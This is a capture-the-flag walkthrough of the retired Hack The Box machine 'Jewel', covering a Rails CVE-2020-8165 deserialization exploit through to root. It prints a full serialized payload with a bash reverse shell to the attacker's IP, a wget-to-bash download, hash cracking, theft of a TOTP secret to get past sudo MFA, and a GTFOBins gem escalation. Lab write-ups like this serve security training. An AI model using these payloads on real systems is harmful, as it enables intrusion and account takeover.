# Jewel

This is the write-up for the box Jewel that got retired at the 13th February 2021.
My IP address was 10.10.14.6 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.211    jewel.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/jewel.nmap 10.10.10.211
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
8000/tcp open  http    Apache httpd 2.4.38
|_http-generator: gitweb/2.20.1 git/2.20.1
| http-title: 10.10.10.211 Git
|_Requested resource was http://10.10.10.211:8000/gitweb/
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
|_http-title: BL0G!
|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 8080)

The web page on port 8080 has the title _"BL0G!"_ an looks like a custom developed website.
There are articles from the users _jennifer_ and _bill_ which could be potential usernames.

On the top right it is possible to _Sign Up_ and _Log In_.
After signing up and login in, there is not more functionality than before.

The HTTP Server header shows that it is powered by **nginx 1.14.2** and **Phusion Passenger 6.0.6**.
The software [Phusion Passenger](https://github.com/phusion/passenger) is a web server that supports Ruby, Python and Node.js.

## Checking HTTP (Port 8000)

On the web page on port 8000 a **Git repository** with the description _"BL0G!"_ is hosted.
This seems to be the source code of the web application on port 8080.

It can be downloaded by clicking on _Snapshot_ and then the archive can be decompressed:
```
tar -xvzf git-5d6f436.tar.gz
```

In there is a _config.ru_ and _Gemfile_ which means that it is developed with **Ruby on Rails**.
The file _Gemfile.lock_ shows all modules and versions of this Ruby application:
```
(...)
rails (5.2.2.1)
```

The version of the **Rails** module for the web server is [version 5.2.2.1](https://rubygems.org/gems/rails/versions/5.2.2.1) from March 2019.
When searching through the [CVEs on Mitre](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=rails), we find [CVE-2020-8165](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165):

> "A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE"

It can be checked if the application is vulnerable to this by searching for the string in the [vulnerability description](https://groups.google.com/g/rubyonrails-security/c/bv6fW4S0Y1c):
```
grep -iR "raw: true"
```
```
app/controllers/application_controller.rb:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) do
app/controllers/users_controller.rb:      @current_username = cache.fetch("username_#{session[:user_id]}", raw: true) {user_params[:username]}
```

In the [Ruby on Rails documentation](https://guides.rubyonrails.org/caching_with_rails.html#activesupport-cache-memcachestore) the _fetch_ method and _raw_ is explained.

### Exploiting Web Application on Port 8080

For this vulnerability there is [Proof-of-Concept code on GitHub](https://github.com/masahiro331/CVE-2020-8165).

The _fetch_ method is used in _app/controllers/users_controller.rb_ in the _update_ function when editing a users profile.
We created a user earlier and the _Username_ field can be used to send a serialized object:
```
http://10.10.10.211:8080/users/18/edit
```

Installing `rails`:
```
apt install rails
```

Creating new Rails project:
```
rails new exploit

cd exploit
```

Starting `rails console` and creating serialized object:
```
rails console
```
```
irb(main):> code = '`/bin/bash -c "bash -i >& /dev/tcp/10.10.14.6/9001 0>&1"`'
irb(main):> erb = ERB.allocate
irb(main):> erb.instance_variable_set :@src, code
irb(main):> erb.instance_variable_set :@filename, "1"
irb(main):> erb.instance_variable_set :@lineno, 1
irb(main):> payload=Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
irb(main):> require 'uri'
irb(main):> puts URI.encode_www_form(payload: payload)
```

Serialized object:
```
%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3E%60%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.6%2F9001+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
```

Sending a request with the serialized object to the server in the _username_ parameter:
```
POST /users/18/edit HTTP/1.1
Host: 10.10.10.211:8080
(...)

utf8=%E2%9C%93&_method=patch&authenticity_token=y92tnwcDEsuRKgVHGNSAHY%2FhR6Rp7L1q6tOd2XX5O7gE74o9%2Fkc1KJ%2Fg7LcRnr%2F9C%2BbaimXKDv4tu8NQMADj1A%3D%3D&user%5Busername%5D=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%3E%60%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.6%2F9001+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T&commit=Update+User
```

Browsing to the profile:
```
GET /users/18 HTTP/1.1
```

After requesting the profile, the object will get processed, execute the code and a reverse shell as _bill_ returns.

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Linux Enumeration Script**:
```
wget -O - -q 10.10.14.6/linpeas.sh | bash
```

It finds two password hashes in the file _/var/backups/dump_2020-08-27.sql_ and _/home/bill/blog/bd.sql_:
```
jennifer:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
bill:$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW
```
```
bill:$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
jennifer:$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
```

Trying to crack the hashes with **Hashcat**:
```
hashcat -m 3200 jewel.hashes /usr/share/wordlists/rockyou.txt --username
```

It cracks the password of _bill_ from the SQL dump file and it is:
> spongebob

We are this user at the moment, but with the password it is possible to check the `sudo` permissions:
```
sudo -l

[sudo] password for bill:
Verification code:
```

After the password is validated, it asks for a _Verification code_ and this looks like a **Multi-Factor Authentication** mechanism.
In the home directory of _bill_ is a hidden file called _.google_authenticator_ with some content:
```
2UQI3R52WFCLE6JTLDCSJYMJH4
" WINDOW_SIZE 17
" TOTP_AUTH
```

Lets copy this to our local client and install **OathTool** to generate our own **One-Time-Pad (OTP)**:
```
apt install oathtool
```

Generating a token with the copied file:
```
oathtool --totp -b @google_authenticator
```

This token changes after a short while, so it may take several tries, but after that `sudo -l` will show the root permissions for this user:
```
User bill may run the following commands on jewel:
    (ALL : ALL) /usr/bin/gem
```

The user _bill_ can run `gem` as root and this is the command line tool for the package repository **RubyGems** for Ruby.

This binary has an entry in [GTOFBins](https://gtfobins.github.io/gtfobins/gem/#sudo) with which it is possible to escalate privileges:
```
sudo gem open -e "/bin/sh -c /bin/sh" rdoc
```

It works and starts a shell as root!
